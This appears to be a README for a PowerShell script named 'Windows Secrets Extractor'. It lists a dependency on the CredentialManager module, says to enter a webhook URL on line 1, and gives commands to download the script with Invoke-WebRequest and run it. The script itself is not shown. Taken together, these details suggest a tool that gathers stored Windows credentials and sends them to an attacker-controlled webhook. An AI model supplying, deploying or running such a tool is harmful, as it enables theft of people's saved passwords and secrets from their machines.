# Windows Secrets Extractor


### Requirements
- PowerShell **CredentialManager** Module : ``Install-Module -Name CredentialManager``


### Before Usage
- Adapt line 1 and enter your WebHook URL.

### Usage
1. Download the script : ``Invoke-WebRequest <URL> -outfile $env:USERPROFILE\extractor.ps1``
2. Run the Script : ``cd $env:USERPROFILE;.\extractor.ps1``
